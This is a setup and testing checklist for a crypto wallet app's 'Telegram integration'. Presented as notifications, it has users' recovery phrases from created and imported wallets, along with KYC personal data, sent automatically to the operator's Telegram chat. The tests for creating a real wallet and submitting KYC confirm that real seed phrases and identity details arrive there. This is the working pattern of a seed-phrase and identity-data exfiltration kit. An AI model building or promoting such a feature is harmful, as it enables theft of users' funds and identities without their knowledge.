# Telegram Integration - Setup Checklist & Testing Guide

## ✅ Pre-Setup Checklist

- [ ] You have a Telegram account
- [ ] You can access Telegram (web, desktop, or mobile)
- [ ] You're ready to create a bot token
- [ ] You have access to your project's `.env.local` file

## 🚀 Setup Steps (Complete in Order)

### Step 1: Create Your Telegram Bot ⏱️ ~2 minutes

- [ ] Open Telegram and search for: `@BotFather`
- [ ] Click "Start" to begin chat
- [ ] Send the command: `/newbot`
- [ ] Follow the prompts:
  - [ ] Choose a name (e.g., "Ripple Lane Bot")
  - [ ] Choose a username (e.g., "ripple_lane_bot") - must end with "_bot"
- [ ] BotFather will send you a **Bot Token** - copy and save it safely
  - Format looks like: `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`

**✅ Step 1 Complete:** You now have your `VITE_TELEGRAM_BOT_TOKEN`

---

### Step 2: Get Your Chat ID ⏱️ ~1 minute

- [ ] In Telegram, find and message your newly created bot
  - Search for the username you chose in Step 1
  - Click "Start"
- [ ] Send any message to it (even just "hi")
- [ ] Open this URL in your browser, replacing `{TOKEN}` with your bot token:
  ```
  https://api.telegram.org/bot{TOKEN}/getUpdates
  ```
- [ ] Look for this in the response:
  ```json
  "chat":{"id": 987654321}
  ```
- [ ] Copy the number - that's your **Chat ID** (e.g., `987654321`)

**✅ Step 2 Complete:** You now have your `VITE_TELEGRAM_CHAT_ID`

---

### Step 3: Configure Environment Variables ⏱️ ~1 minute

- [ ] In your project root, create or open `.env.local`
- [ ] Add these two lines:
  ```env
  VITE_TELEGRAM_BOT_TOKEN=your_bot_token_here
  VITE_TELEGRAM_CHAT_ID=your_chat_id_here
  ```
- [ ] Replace with your actual values from Steps 1 & 2
- [ ] Save the file
- [ ] **IMPORTANT:** Verify `.env.local` is in your `.gitignore` ✅

**✅ Step 3 Complete:** Environment variables configured

---

### Step 4: Restart Development Server ⏱️ ~30 seconds

- [ ] Stop your development server (Ctrl+C or Cmd+C)
- [ ] Restart it:
  ```bash
  npm run dev
  # or
  yarn dev
  # or
  bun run dev
  ```
- [ ] Wait for the server to fully start

**✅ Step 4 Complete:** Ready to test!

---

## 🧪 Testing Phase

### Test 1: Verify Connection (MUST DO FIRST) ✅

1. [ ] Open your browser to: `http://localhost:5173/telegram-test`
2. [ ] You should see the "Telegram Integration Test" page
3. [ ] Click the **"Test Connection"** button
4. [ ] **Expected result:**
   - [ ] Page shows ✅ success message
   - [ ] Your Telegram chat receives a test message
5. [ ] **If it fails:**
   - [ ] Check your bot token has no typos
   - [ ] Check your chat ID has no typos
   - [ ] Make sure you messaged the bot at least once
   - [ ] Verify `.env.local` was saved
   - [ ] Restart dev server
   - [ ] Try again

**Status:** ✅ Connection working / ❌ Need to debug

---

### Test 2: Test Wallet Notification

1. [ ] Still on `/telegram-test` page
2. [ ] Click **"Test Wallet Created"** button
3. [ ] **Expected result:**
   - [ ] Page shows success
   - [ ] Your Telegram chat receives a wallet message with:
     - [ ] Wallet name
     - [ ] Recovery phrase (seed)
     - [ ] All blockchain addresses
     - [ ] Timestamp

**Sample message:**
```
🔐 Wallet Created

Wallet Name: Test Wallet
Recovery Phrase (KEEP SAFE):
abandon abandon abandon...
Addresses:
XRP: rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH
...
```

**Status:** ✅ Working / ❌ Check Telegram connection

---

### Test 3: Test KYC Notification

1. [ ] Still on `/telegram-test` page
2. [ ] Click **"Test KYC Submission"** button
3. [ ] **Expected result:**
   - [ ] Page shows success
   - [ ] Your Telegram chat receives a KYC message with:
     - [ ] User information
     - [ ] Address information
     - [ ] KYC status
     - [ ] Submission timestamp

**Sample message:**
```
📋 KYC Information Submitted

User ID: test-user-123
Personal Information:
Name: John Doe
Email: john@example.com
...
```

**Status:** ✅ Working / ❌ Check Telegram connection

---

### Test 4: Test Custom Message

1. [ ] Still on `/telegram-test` page
2. [ ] Scroll to "Custom Message" section
3. [ ] Enter a test message, for example:
   ```
   <b>Hello!</b> This is a <code>test</code> message.
   ```
4. [ ] Click **"Send Custom"** button
5. [ ] **Expected result:**
   - [ ] Your Telegram chat receives the message
   - [ ] Text is formatted as specified (bold, code, etc.)

**Status:** ✅ Working / ❌ Check Telegram connection

---

### Test 5: Create a Real Wallet

Once all tests pass, test with real app usage:

1. [ ] Go to: `http://localhost:5173/dashboard/wallets`
2. [ ] Click **"Add Wallet"** button
3. [ ] Click **"Create Wallet"** option
4. [ ] Fill in wallet name and click create
5. [ ] **Expected result:**
   - [ ] Wallet created in app
   - [ ] Your Telegram chat receives notification with:
     - [ ] Real wallet name
     - [ ] Real recovery phrase
     - [ ] Real blockchain addresses

⚠️ **Security Note:** Save this recovery phrase safely! It's your only backup!

**Status:** ✅ Working / ❌ Check Telegram connection

---

### Test 6: Import a Wallet

1. [ ] Still on wallets page
2. [ ] Click **"Add Wallet"** button
3. [ ] Click **"Import Wallet"** option
4. [ ] Paste a recovery phrase and name
5. [ ] Click import
6. [ ] **Expected result:**
   - [ ] Wallet imported in app
   - [ ] Your Telegram chat receives notification

**Status:** ✅ Working / ❌ Check Telegram connection

---

### Test 7: Submit KYC

1. [ ] Go to: `http://localhost:5173/dashboard/kyc`
2. [ ] Fill out personal information
3. [ ] Fill out address information
4. [ ] Upload documents
5. [ ] Submit KYC
6. [ ] **Expected result:**
   - [ ] KYC submitted in app
   - [ ] Your Telegram chat receives notification with personal data

**Status:** ✅ Working / ❌ Check Telegram connection

---

## 🐛 Troubleshooting

| Problem | Solution |
|---------|----------|
| Page shows "Telegram credentials not configured" | Check `.env.local` has both variables, restart server |
| Test message button does nothing | Open browser console (F12) for errors |
| Messages appear but with wrong chat ID | Get correct chat ID from `/getUpdates` API call |
| "Invalid token" error | Regenerate token from @BotFather, update `.env.local` |
| Messages appear in wrong chat | Verify chat_id in `.env.local` matches your personal chat |
| Wallet created but no Telegram message | Check connection first with Test Connection button |
| Network errors in console | Check you have internet connection and bot token is valid |

---

## 📋 All Features Checklist

### Automatic Notifications (These should all work now)

- [ ] Wallet creation sends seed phrase to Telegram
- [ ] Wallet import sends seed phrase to Telegram
- [ ] KYC submission sends personal data to Telegram
- [ ] All messages are formatted nicely with HTML
- [ ] Messages include timestamps
- [ ] Error handling prevents app crashes

### Test Page Features

- [ ] Test Connection button works
- [ ] Test Wallet Notification button works
- [ ] Test KYC Notification button works
- [ ] Custom Message feature works
- [ ] Setup instructions visible on page

### Documentation

- [ ] `TELEGRAM_QUICK_START.md` - Quick reference ✅
- [ ] `TELEGRAM_SETUP.md` - Detailed guide ✅
- [ ] `TELEGRAM_INTEGRATION.md` - Overview ✅
- [ ] `TELEGRAM_IMPLEMENTATION.md` - Implementation details ✅
- [ ] `TELEGRAM_ARCHITECTURE.md` - System diagrams ✅

---

## 🎯 Success Criteria

You'll know everything is working when:

✅ Test Connection shows green success
✅ Test messages appear in your Telegram chat
✅ Creating a wallet sends notification to Telegram
✅ Importing a wallet sends notification to Telegram
✅ Submitting KYC sends notification to Telegram
✅ All messages are properly formatted with HTML
✅ No errors in browser console
✅ Messages include all relevant data

---

## 🔒 Security Checklist

- [ ] `.env.local` is in `.gitignore`
- [ ] Bot token never appears in commits
- [ ] Chat ID never appears in commits
- [ ] No secrets hardcoded in source files
- [ ] `.env.local` file is local-only
- [ ] You're the only one with access to bot token
- [ ] Bot is set to private (only you message it)

---

## 📞 Quick Support

**If stuck on setup:**
1. Make sure you completed Steps 1-4 in order
2. Check all values in `.env.local` are correct (no extra spaces)
3. Restart your dev server after editing `.env.local`
4. Open browser console (F12) for detailed error messages

**If test fails:**
1. Click "Test Connection" first to verify credentials
2. Check Telegram chat for test message
3. If no message, verify chat ID is correct
4. Verify bot token starts with numbers and contains colon

**Still stuck?**
1. Read `TELEGRAM_SETUP.md` for detailed instructions
2. Check `TELEGRAM_QUICK_START.md` for quick reference
3. Review error messages in browser console
4. Verify `.env.local` file exists and has correct format

---

## 🎉 Next Steps After Setup

1. **Monitor your Telegram chat** for all wallet and KYC activity
2. **Customize message formats** if desired (edit `telegramService.ts`)
3. **Add more notifications** for other events (see `TELEGRAM_IMPLEMENTATION.md`)
4. **Keep your bot token safe** - don't share it with anyone
5. **Enable 2FA on your Telegram account** for extra security

---

**Setup Status:** [ ] Not Started | [ ] In Progress | [✅] Complete

**Last Updated:** February 2, 2025
